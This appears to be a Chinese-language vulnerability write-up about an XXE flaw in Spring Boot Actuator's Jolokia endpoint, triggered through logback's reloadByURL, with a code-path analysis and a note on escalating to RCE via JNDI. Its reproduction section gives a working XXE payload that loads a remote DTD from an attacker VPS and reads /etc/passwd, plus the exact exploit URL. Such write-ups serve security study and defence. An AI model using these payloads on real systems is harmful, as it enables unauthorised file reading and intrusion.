<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs2F00A314{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs86A93FFD{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:italic;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xffc33005cceacf89724158e967811f97939ad19"><span class="csDE05BCC">Spring Boot Actuator jolokia </span><span class="csECDA2D3">配置不当导致的</span><span class="csDE05BCC">XXE</span><span class="csECDA2D3">漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Spring boot </span><span class="cs9C1B1871">会把</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">/!</span><span class="cs8926E06"> </span><span class="cs9C1B1871">解析成</span><span class="cs8926E06"> </span><span class="cs2F00A314">/</span><span class="cs9C1B1871">，所以我们只要署恶意脚本，让被攻击服务器访问就会触发漏洞。</span><span class="cs8926E06"><br/></span><span class="cs86A93FFD">前提条件</span><span class="cs8926E06"><br/></span><span class="csE3F655E4">查看</span><span class="cs5BEC2C28">jolokia/list</span><span class="csE3F655E4">中存在的</span><span class="cs5BEC2C28"> Mbeans</span><span class="csE3F655E4">，是否存在</span><span class="cs5BEC2C28">logback </span><span class="csE3F655E4">库提供的</span><span class="cs5BEC2C28">reloadByURL</span><span class="csE3F655E4">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">https://www.0-sec.org:9090/jolokia/list</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="275" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Spring Boot 2.x</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<h4 class="cs868C439D">
			<a name="触发流程"><span class="cs6EDCDAE2">触发流程</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">Spring-boot-actuator</span><span class="cs8926E06">-&gt;</span><span class="cs5BEC2C28">Jolokia</span><span class="cs8926E06">-&gt;</span><span class="cs5BEC2C28">Logback</span><span class="cs8926E06">-&gt;</span><span class="cs5BEC2C28">JNDI</span><span class="cs8926E06">-&gt;</span><span class="cs5BEC2C28">Rce</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以在</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">JolokiaMvcEndpoint</span><span class="cs8926E06"> </span><span class="cs9C1B1871">类中先看看</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">jolokia</span><span class="cs8926E06"> </span><span class="cs9C1B1871">是如何注册的，如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="286" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">只要是</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">/jolokia</span><span class="cs8926E06"> </span><span class="cs9C1B1871">为第一个</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">path</span><span class="cs8926E06"> </span><span class="cs9C1B1871">节点的，都会进入它的执行逻辑中，可以一直跟进到</span><span class="cs5BEC2C28">org.jolokia.http.HttpRequestHandler#handleGetRequest</span><span class="cs8926E06"> </span><span class="cs9C1B1871">里</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="135" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在上图红框流程中，先对</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">path</span><span class="cs8926E06"> </span><span class="cs9C1B1871">做</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">/</span><span class="cs8926E06"> </span><span class="cs9C1B1871">切割分组，不过可以</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">1!/2</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这样能够保留</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">/</span><span class="cs8926E06"> </span><span class="cs9C1B1871">符号，后边用得到</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">可以根据</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">path</span><span class="cs8926E06"> </span><span class="cs9C1B1871">节点新建</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">JmxRequest</span><span class="cs8926E06"> </span><span class="cs9C1B1871">对象</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">大致如下图所示，有这么些类别可以指定</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image3.png" width="520" height="256" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们主要观察</span><span class="cs8926E06"> exec </span><span class="cs9C1B1871">类型的，它对应</span><span class="cs8926E06"> org.jolokia.request.JmxExecRequest </span><span class="cs9C1B1871">类型，在它被创建时，会调用父类</span><span class="cs8926E06"> org.jolokia.request.JmxObjectNameRequest </span><span class="cs9C1B1871">的构造函数，如下所示</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="92" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06"> initObjectName </span><span class="cs9C1B1871">函数，如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="113" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如上图，这里将</span><span class="cs8926E06"> exec </span><span class="cs9C1B1871">后面的第一个</span><span class="cs8926E06"> path </span><span class="cs9C1B1871">节点带进了</span><span class="cs8926E06"> javax.management.ObjectName </span><span class="cs9C1B1871">构造函数中</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="252" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据上图中的注释描述，可以根据一个字符串（对象名称的字符串表示形式）创建一个</span><span class="cs8926E06"> ObjectName </span><span class="cs9C1B1871">对象，这个对象和后面的反射执行指定函数大有关系</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后将</span><span class="cs8926E06"> path </span><span class="cs9C1B1871">的下一个节点赋值到</span><span class="cs8926E06"> JmxExecRequst </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> operation </span><span class="cs9C1B1871">属性上，将剩余的</span><span class="cs8926E06"> path </span><span class="cs9C1B1871">节点作为</span><span class="cs8926E06"> List </span><span class="cs9C1B1871">赋值给</span><span class="cs8926E06"> arguments </span><span class="cs9C1B1871">属性</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">至此</span><span class="cs8926E06"> JmxRequest </span><span class="cs9C1B1871">创建完毕，进入</span><span class="cs8926E06"> org.jolokia.http.HttpRequestHandler#executeRequest </span><span class="cs9C1B1871">执行流程当中，其中很多部分就不详细跟踪，大致是又根据</span><span class="cs8926E06"> exec </span><span class="cs9C1B1871">类型创建了一个</span><span class="cs8926E06"> org.jolokia.handler.ExecHandler </span><span class="cs9C1B1871">对象</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">看见</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">很好奇参数转换过程是怎么样的</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">直接进入到</span><span class="cs8926E06"> ExecHandler </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> doHandRequest </span><span class="cs9C1B1871">当中</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="182" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如上图，就是将</span><span class="cs8926E06"> JmxExecRequst </span><span class="cs9C1B1871">中的</span><span class="cs8926E06"> operation </span><span class="cs9C1B1871">做参数类型鉴定，然后根据目标函数需要的参数类型，将</span><span class="cs8926E06"> arguments </span><span class="cs9C1B1871">转换成对应类型，最后执行</span><span class="cs8926E06"> server.invoke </span><span class="cs9C1B1871">的调用，这个调用就是执行我们指定的类中的指定的函数，那这里是不是能够任意类和任意函数都能执行呢，不是的，需要提前注册，注册的内容可以通过</span><span class="cs8926E06"> </span><span class="cs9FB05234">/jolokia/list</span><span class="cs8926E06"> </span><span class="cs9C1B1871">查看</span></p><p class="cs40DD2BC9"><span class="cs8926E06">ch.qos.logback.classic.jmx.JMXConfigurator </span><span class="cs9C1B1871">就是能够调用的类之一，到了这里就进入到了</span><span class="cs8926E06"> </span><span class="cs9FB05234">logback</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的依赖包中</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">简单查看一下它的函数：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image8.png" width="403" height="536" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先这个类名就很有意思</span><span class="cs8926E06"> JMXConfigerator </span><span class="cs9C1B1871">，和</span><span class="cs8926E06"> JMX </span><span class="cs9C1B1871">的配置有关，函数中也有个</span><span class="cs8926E06"> reloadByURL </span><span class="cs9C1B1871">，从名字就能会意出通过远程加载配置文件并且重启配置</span><span class="cs8926E06">23333</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先查看</span><span class="cs8926E06"> reloadByURL </span><span class="cs9C1B1871">函数</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="300" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如上图，它的参数是一个</span><span class="cs8926E06"> URL </span><span class="cs9C1B1871">类型的，我们传入进去只能是</span><span class="cs8926E06"> String</span><span class="cs9C1B1871">，但是不用方，</span><span class="cs8926E06">ExecHandler </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> doHandRequest </span><span class="cs9C1B1871">当中会对目标函数的参数类型做适配，将</span><span class="cs8926E06"> String </span><span class="cs9C1B1871">转换成</span><span class="cs8926E06"> URL </span><span class="cs9C1B1871">。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">但是这里有个问题，因为需要指定</span><span class="cs8926E06"> schema </span><span class="cs9C1B1871">，所以必须有类似</span><span class="cs8926E06"> http:// </span><span class="cs9C1B1871">这样的开头，而我们的</span><span class="cs8926E06"> path </span><span class="cs9C1B1871">进去以后，会用</span><span class="cs8926E06"> / </span><span class="cs9C1B1871">切割分组的，所以就需要用到前面的流程中对</span><span class="cs8926E06"> uri </span><span class="cs9C1B1871">的处理过程，只需要这样请求就好：</span><span class="cs8926E06"> </span><span class="cs9FB05234">http:!/!/</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟入</span><span class="cs8926E06"> doConfigure </span><span class="cs9C1B1871">函数</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="226" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从</span><span class="cs8926E06"> url </span><span class="cs9C1B1871">获取返回流传入下一个</span><span class="cs8926E06"> doConfigure </span><span class="cs9C1B1871">函数，这里也能</span><span class="cs8926E06"> ssrf </span><span class="cs9C1B1871">的</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">跟进函数如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="105" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续跟进上图中的红色方框如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image12.png" width="560" height="178" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如上图所示，在调用</span><span class="cs8926E06"> recordEvents </span><span class="cs9C1B1871">的时候带入了输入流，这个输入流是我们可控的，即在自己服务器上放置的</span><span class="cs8926E06"> xml </span><span class="cs9C1B1871">文件，</span><span class="cs8926E06"> xml </span><span class="cs9C1B1871">解析的过程就是发生在</span><span class="cs8926E06"> recordEvents </span><span class="cs9C1B1871">的执行过程中，而后红框的调用，是对已经解析完成的内容进行一定的逻辑操作，然后重载配置，后面的过程就不分析了，简单的去看一下</span><span class="cs8926E06"> recordEvents </span><span class="cs9C1B1871">执行过程，如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image13.png" width="560" height="93" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">很简单，</span><span class="cs8926E06">build </span><span class="cs9C1B1871">完成后直接</span><span class="cs8926E06"> parse</span><span class="cs9C1B1871">，那我们查看一下</span><span class="cs8926E06"> build </span><span class="cs9C1B1871">的时候是否有做防护，如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image14.png" width="560" height="219" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">什么防护和限制都莫得，所以这里也可以造成</span><span class="cs8926E06"> xxe</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那么到现在为止，只是梳理出来了</span><span class="cs8926E06"> xxe </span><span class="cs9C1B1871">的触发，</span><span class="cs8926E06">rce </span><span class="cs9C1B1871">呢</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">不方，我们查一查</span><span class="cs8926E06"> logback insertFormJNDI </span><span class="cs9C1B1871">标签啥</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image15.png" width="560" height="331" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中的</span><span class="cs8926E06"> env-entry-name </span><span class="cs9C1B1871">就是指向</span><span class="cs8926E06"> jndi </span><span class="cs9C1B1871">的服务器地址，那么这里我们可以换成自己的恶意</span><span class="cs8926E06"> jndi </span><span class="cs9C1B1871">服务器地址，通过</span><span class="cs8926E06"> jndi </span><span class="cs9C1B1871">触发</span><span class="cs8926E06"> java </span><span class="cs9C1B1871">反序列化，最终导致</span><span class="cs8926E06"> RCE</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">在</span><span class="cs8926E06">VPS</span><span class="cs9C1B1871">上创建</span><span class="cs8926E06">logback.xml</span><span class="cs9C1B1871">，</span><span class="cs8926E06">logback</span><span class="cs9C1B1871">中填写</span><span class="cs8926E06">jndi</span><span class="cs9C1B1871">服务，当调用时直接触发恶意</span><span class="cs8926E06">class</span><span class="cs9C1B1871">。</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!DOCTYPE a [ &lt;!ENTITY % remote SYSTEM &quot;http://vps</span><span class="cs7FFD2630">地址</span><span class="cs9FB05234">/</span><span class="cs7FFD2630">恶意文件</span><span class="cs9FB05234">.dtd&quot;&gt;%remote;%int;]&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;a&gt;&amp;trick;&lt;/a&gt;</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">在</span><span class="cs8926E06">VPS</span><span class="cs9C1B1871">上创建</span><span class="cs8926E06">ian.dtd</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#39;:%d;&#39;&gt;&quot;&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image16.png" width="425" height="68" alt="" style="border-width:0px;" /></span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">开启</span><span class="cs8926E06">http</span><span class="cs9C1B1871">服务</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">python -m SimpleHTTPServer 80</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">远程访问</span><span class="cs8926E06">logback.xml</span><span class="cs9C1B1871">文件</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">https://www.0-sec.org:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS</span><span class="cs7FFD2630">地址</span><span class="cs9FB05234">!/logback.xml</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image17.png" width="560" height="255" alt="" style="border-width:0px;" /></span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">可以看到服务器上也返回了响应日志</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84XXE%e6%bc%8f%e6%b4%9e_files/image18.png" width="560" height="38" alt="" style="border-width:0px;" /></span></li></ul>
		<h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/4258</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</span></p></body>
</html>
